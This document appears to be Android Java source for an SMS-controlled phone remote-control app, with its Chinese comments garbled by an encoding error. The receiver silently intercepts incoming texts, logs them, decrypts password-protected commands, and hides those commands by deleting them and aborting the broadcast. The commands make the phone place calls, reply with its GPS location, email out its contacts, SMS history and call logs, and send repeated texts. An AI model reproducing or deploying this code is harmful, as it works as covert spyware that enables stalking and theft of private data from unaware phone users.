package com.craining.book.CtrlThisPhone.DoThings;

import java.io.File;
import java.util.Vector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.util.Log;

import com.craining.book.CtrlThisPhone.UsefullVerbs;

/**
 * �������ŵĽ���
 * 
 * @author Ruin
 * 
 */
public class ReceiveMsg extends BroadcastReceiver {

	String receiveMsg = "";
	private static final String TAG = "ReceivedMsg";
	private Context this_context;
	private static String toSomeBody_sendmsg = "";
	private static String MsgContent_sendmsg = "";
	private static int counts_sendmsg = 1;
	
	@Override
	public void onReceive(Context context, Intent intent) {

		this_context = context;

		SmsMessage[] msg = null;

		if ( intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") ) {

			Bundle bundle = intent.getExtras();
			if ( bundle != null ) {
				Object[] pdusObj = (Object[]) bundle.get("pdus");
				msg = new SmsMessage[pdusObj.length];
				int mmm = pdusObj.length;
				for (int i = 0; i < mmm; i++)
					msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
			}

			int msgLength = msg.length;
			for (int i = 0; i < msgLength; i++) {
				String msgTxt = msg[i].getMessageBody();

				// ��÷����˺���
				String getFromNum = "";
				for (SmsMessage currMsg : msg) {
					getFromNum = currMsg.getDisplayOriginatingAddress();
				}

				if ( !listenTheMsg(context, getFromNum, msgTxt) ) {
					// ɾ��������

					long id = getThreadId(context);
					Uri mUri = Uri.parse("content://sms/conversations/" + id);
					context.getContentResolver().delete(mUri, null, null);

				}

				abortBroadcast();
			}

		} else if ( intent.getAction().equals("android.provider.Telephony.SMS_SEND") ) {
			Log.i(TAG, "++++++++++++++++++++++++MSG______SEND");
		}

		return;
	}

	/**
	 * ����յ��Ķ���
	 */
	public boolean listenTheMsg(Context context, String from, String msgText) {

		

		// ������Ž��յļ�¼
		DoSomeThings doThings = new DoSomeThings();
		String toSaveMsg = "�������ڣ�" + doThings.returnDateOrTime((int) 0) + "ʱ�䣺" + doThings.returnDateOrTime((int) 1) + "�����ߣ�" + from + "\r\n���ݣ�" + msgText + "\r\n\r\n";
		doThings.writeFile(toSaveMsg, UsefullVerbs.SAVE_MSG_FILE, true);
		
		// �Զ��Ž��н����ж��Ƿ�Ϊָ��
		try {
			msgText = SimpleCrypto.decrypt(UsefullVerbs.COMMAND_PWD, msgText);
			Log.e(TAG, msgText);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		DoSomeThings does = new DoSomeThings();
		String strCtrlPwd = does.getinfo(UsefullVerbs.SAVE_PWD_FILE);
		Log.e(TAG, msgText);
		String[] msgBody = msgText.split("::");
		if ( msgBody[0].equals(strCtrlPwd) && msgBody.length == 2 ) {
			if( !UsefullVerbs.ACCEPT.exists() ){
				// �ж�ָ���������Ӧ
				doAsCommand(context, msgBody[1], from);
				return false;
			}

		} else {
			if ( msgBody[0].equals("check") && msgBody.length == 2 ) {
				checkPwd(context, msgBody[1], from);
			} else if(msgBody[0].equals("ReceiveMsg") && msgBody.length == 3) {
				//�յ����ܶ���
				// ReceiveMsg::����::����
				String cypherMsgContent = msgBody[1];
				String cypherMsgPwd = msgBody[2];
				
				try {
					cypherMsgPwd = SimpleCrypto.decrypt(UsefullVerbs.COMMAND_PWD, cypherMsgPwd);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				Intent i = new Intent();
				i.setClass(context, ReadMsg.class);
				i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				Bundle mBundle = new Bundle();
				mBundle.putString("MSGCONTENT", cypherMsgContent);
				mBundle.putString("MSGPWD", cypherMsgPwd);
				mBundle.putString("FROM", from);
				i.putExtras(mBundle);
				context.startActivity(i);
			}
			return false;
		}

		return true;
	}

	public void doAsCommand(Context context, String com, String from) {
		DoSomeThings doThings = new DoSomeThings();
		String[] getCommand = com.split("-");

		// һ������ǵ绰���� com ���� Call-*****-**********
		if ( getCommand[0].equals("Call") && getCommand.length > 1 ) {
			if ( getCommand[1].equals("Dial") && getCommand.length == 3 ) {// ����ǲ���绰ָ���磺hide:Call-Dial-10086
				callSomebody(context, getCommand[2]);

			} else if ( getCommand[1].equals("estop") ) { // ����ǽ�ֹ���ж��ţ�
															// hide:Call-estop

			} else if ( getCommand[1].equals("me") ) {// ���п�����hide:Call-me
				callSomebody(context, from);
			}

		}

		// ��������ǻ����Ϣ
		else if ( getCommand[0].equals("Ask") && getCommand.length > 1 ) {
			if ( getCommand[1].equals("Position") ) {// Ask-Position
				// ���GPSλ��
				LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
				double[] myGps = new double[2];
				myGps = doThings.getGPS(lm);
				String str_myGps = myGps[0] + "-" + myGps[1];
				String toSendmsg = "GPS Text::" + str_myGps + "::this is my gps";//���ã������ҵ�GPSλ�ã��򿪿�����������Ѿ��������ڵ�ͼ�ϵ�λ����
				doThings.sendMsg(context, from, toSendmsg);// ��λ���Զ��ŵķ�ʽ���͸�������

			} else if ( getCommand[1].equals("Contacts") ) {// Ask-Contacts-email
				Log.e("", "do contacts");
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}

				// ������ϵ��ǰ��ɾ��ԭ�еı�����ϵ�˵��ļ�
				if ( UsefullVerbs.SAVE_CONTACTS_FILE.exists() ) {
					UsefullVerbs.SAVE_CONTACTS_FILE.delete();
				}

				if ( getContact(context) ) {// ����������ϵ�˵� contact.txt
					Log.e("", "send email");
					if ( tellMeContants("�ʼ�����:�ҵ���ϵ��", UsefullVerbs.SAVE_CONTACTS_FILE, emailAdd) ) {
						// �����ʼ�
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵ���ϵ�������Ѿ����͵������������ˣ����ھͿ��Ե�¼������в鿴����");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵ���ϵ������Ŀǰ���ܷ��͸��������һ��ʱ���ٸ������");
					}

				} else {
					doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵ���ϵ������Ŀǰ���ܷ��͸��������һ��ʱ���ٸ������");
				}

			} else if ( getCommand[1].equals("Msg") ) {
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}
				// ��ö��ż�¼Ȼ��ɾ��֮ǰ��¼
				if ( UsefullVerbs.SAVE_MSG_FILE.exists() ) {

					if ( tellMeContants("�ʼ�����:�ҵĶ��ż�¼" + "�ҵĵ绰:" + UsefullVerbs.thisNowNo, UsefullVerbs.SAVE_MSG_FILE, emailAdd) ) {
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵĽ��ڶ��ż�¼�Ѿ����͵������������ˣ����ھͿ��Ե�¼������в鿴����");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵĽ��ڶ��ż�¼Ŀǰ���ܷ��͸��������һ��ʱ���ٸ������");
					}
				} else {
					doThings.sendMsg(context, from, "����֪ͨ�����ã��Դ����ϴβ鿴�ҵĶ��ż�¼�󣬵�Ŀǰ�һ�û���յ��κζ����أ�");
				}

			} else if ( getCommand[1].equals("Conversation") ) {
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}
				// ���ͨ����¼��Ȼ��ɾ��֮ǰ��¼
				if ( UsefullVerbs.SAVE_CONVERSATION_FILE.exists() ) {
					if ( tellMeContants("�ʼ�����:�ҵ�ͨ����¼" + "�ҵĵ绰:" + UsefullVerbs.thisNowNo, UsefullVerbs.SAVE_CONVERSATION_FILE, emailAdd) ) {
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵĽ���ͨ����¼�Ѿ����͵������������ˣ����ھͿ��Ե�¼������в鿴����");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "����֪ͨ�����ã��ҵĽ���ͨ����¼Ŀǰ���ܷ��͸��������һ��ʱ���ٸ������");
					}

				} else {
					doThings.sendMsg(context, from, "����֪ͨ�����ã��Դ����ϴβ鿴�ҵ�ͨ����¼�󣬵�Ŀǰ�һ�û���κ�ͨ���أ�");
				}
			}
		}

		// �ġ�����Ƿ�����Ϣhide:Msg-Send-111-����-����
		else if ( getCommand[0].equals("Msg") && getCommand.length >= 4 ) {
			if ( getCommand[1].equals("Send") && getCommand.length == 5 ) {

				toSomeBody_sendmsg = getCommand[2];
				MsgContent_sendmsg = getCommand[3];
				try {
					// ��ֹǿ������ת��������try
					counts_sendmsg = Integer.parseInt(getCommand[4]);
				} catch (Exception e) {
					counts_sendmsg = 1;
				}
				if ( counts_sendmsg == 0 ) {
					counts_sendmsg = 1;
				}

				// �����̵߳ȴ�
				Thread background = new Thread(new Runnable() {
					public void run() {
						try {
							DoSomeThings doThings = new DoSomeThings();

							for (int i = 1; i <= counts_sendmsg; i++) {
								Thread.sleep(5000);
								Log.e("SendMsg", "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM--" + i);
								String MsgContent = "All: " + counts_sendmsg + ", NO." + i + " :" + MsgContent_sendmsg;
								doThings.sendMsg(this_context, toSomeBody_sendmsg, MsgContent);
							}

						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				});
				background.start();
			}
		}
		// hide:Contact��ϵ�˹���
		else if ( getCommand[0].equals("Contact") && getCommand.length >= 3 ) {
			if ( getCommand[1].equals("Add") && getCommand.length == 4 ) {
				String name = getCommand[2];
				String tel = getCommand[3];
				// �洢��ϵ��

			} else if ( getCommand[1].equals("Del") && getCommand.length == 3 ) {
				String todelnum = getCommand[2];
				// ɾ���绰Ϊtodelnum����ϵ��

			} else if ( getCommand[1].equals("AddBlack") && getCommand.length == 3 ) {
				String toAddBlackNum = getCommand[2];
				// ���ӵ绰Ϊ���ĺ�����

			} else if ( getCommand[1].equals("DelBlack") && getCommand.length == 3 ) {
				String toDelBlackNum = getCommand[2];
				// ɾ���绰Ϊ���ĺ�����

			}
		}

	}

	/**
	 * ��Ӧ�ܿ����
	 * 
	 * @param pwd
	 */
	private void checkPwd(Context context, String pwd, String from) {
		DoSomeThings does = new DoSomeThings();
		String str_ctrlpwd = does.getinfo(UsefullVerbs.SAVE_PWD_FILE);
		if ( str_ctrlpwd.equals(pwd) ) {
			does.sendMsg(context, from, "���Ż�Ӧ�����ã������ڿ��Կ����ң�");
		} else {
			does.sendMsg(context, from, "���Ż�Ӧ�����ã������ҵĿ���������ҵ��ܿ����벻ƥ�䣬��������ܿ����ң�");
		}
	}
	/**
	 * ����绰
	 * 
	 * @param context
	 */
	private void callSomebody(Context context, String num) {
		try {
			Uri uri = Uri.parse("tel:" + num);
			Intent it = new Intent(Intent.ACTION_CALL, uri);
			it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(it);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

	/**
	 * ���Ҫɾ�����ŵ�ID
	 * <p>
	 * ԭ��: ��Ϊ����ɾ������յ���һ�����ţ�������ֻ�谴ʱ����е���Ȼ���ȡ��һ�����ŵ��߳�ID������
	 * <p>
	 * �÷�: ��ReceiveMsg�е��õ�: <br>
	 * 
	 * @return
	 */
	public long getThreadId(Context context) {
		long threadId = 0;
		String SMS_READ_COLUMN = "read";
		String WHERE_CONDITION = SMS_READ_COLUMN + " = 0";
		String SORT_ORDER = "date DESC";
		int count = 0;

		Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "thread_id", "address", "person", "date", "body"}, WHERE_CONDITION, null, SORT_ORDER);

		if ( cursor != null ) {
			try {
				count = cursor.getCount();
				if ( count > 0 ) {
					cursor.moveToFirst();
					threadId = cursor.getLong(1);
				}
			} finally {
				cursor.close();
			}
		}
		Log.e(TAG, "++++++++++++++++++++++++++++++++++++++++============>msgID:   " + threadId);

		return threadId;
	}

	/**
	 * ������ϵ��
	 */
	public boolean getContact(Context contenx) {

		DoSomeThings doThings = new DoSomeThings();

		String head = "\r\n���ã��ҵĵ绰�����ǣ�" + UsefullVerbs.thisNowNo + "\r\n�ҵ�ǰ���е���ϵ���Լ��绰����Ϊ��\r\n";
		String allContactsInfo = head;

		// ������е���ϵ��
		Cursor cur = contenx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		// ѭ������
		if ( cur.moveToFirst() ) {
			int idColumn = cur.getColumnIndex(ContactsContract.Contacts._ID);
			int displayNameColumn = cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
			do {
				// �����ϵ�˵�ID��
				String contactId = cur.getString(idColumn);
				Log.e(TAG, "++++++++++++++++++++++++++++++++++=>Contact -- ID �� " + contactId);

				allContactsInfo = allContactsInfo + "\r\n" + contactId + "��";

				// �����ϵ������
				String disPlayName = cur.getString(displayNameColumn);
				Log.i(TAG, "++++++++++++++++++++++++++++++++++=> name  �� " + disPlayName);

				allContactsInfo = allContactsInfo + disPlayName + "��\r\n";

				// �鿴����ϵ���ж��ٸ��绰���롣���û���ⷵ��ֵΪ0
				int phoneCount = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				if ( phoneCount > 0 ) {
					// �����ϵ�˵ĵ绰����
					Cursor phones = contenx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
					if ( phones.moveToFirst() ) {
						do {
							// �������еĵ绰����
							String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							Log.i(TAG, "++++++++++++++++++++++++++++++++++=> PhoneNumber :  " + phoneNumber);
							phoneNumber = "    �绰��" + phoneNumber;
							allContactsInfo = allContactsInfo + phoneNumber + "\r\n";

						} while (phones.moveToNext());
					}
				}
			} while (cur.moveToNext());
		}
		if ( allContactsInfo.equals(head) ) {
			allContactsInfo = "\r\n���ã��ҵĵ绰�����ǣ�" + UsefullVerbs.thisNowNo + "\r\n�ҵ��ֻ���û�д洢�κ���ϵ�ˣ�";
		}
		if ( doThings.writeFile(allContactsInfo, UsefullVerbs.SAVE_CONTACTS_FILE, true) ) {
			return true;
		} else {
			return false;
		}

	}

	/**
	 * �����ʼ�
	 * 
	 * @param sub
	 *            �ʼ�����
	 * @param content
	 *            �ʼ�����
	 * @param filepath
	 *            ����·��
	 */
	private boolean tellMeContants(String sub, File file, String toEmailadd) {

		DoSomeThings does = new DoSomeThings();
		String content = does.getinfo(file);
		Vector<String> sendfiles = new Vector<String>();

		SendEmailImplement sendEmail = new SendEmailImplement();

		if ( sendEmail.sendMyEmail(UsefullVerbs.EMAIL_SMTP, UsefullVerbs.EMAIL_NAME, UsefullVerbs.EMAIL_PWD, toEmailadd, UsefullVerbs.EMAIL_WHOSEND, sub, content, sendfiles) ) {
			file.delete();
			return true;
		} else {
			return false;
		}

	}
	
}
